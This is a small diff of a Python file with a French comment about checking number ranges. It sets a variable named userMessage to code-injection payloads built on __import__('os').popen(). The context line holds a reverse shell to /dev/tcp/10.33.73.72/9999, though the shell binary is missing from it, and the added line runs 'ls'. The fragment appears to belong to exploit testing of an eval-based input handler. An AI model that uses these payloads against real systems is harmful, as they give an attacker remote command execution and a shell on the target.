@@ -56,7 +56,7 @@ try:
     
    
     userMessage = "__import__('os').popen('-i >& /dev/tcp/10.33.73.72/9999 0>&1').read()"
-
+    userMessage = "__import__('os').popen('ls').read()"
        
 
       # Vérifiez si les nombres sont dans la plage [-100000, 100000]
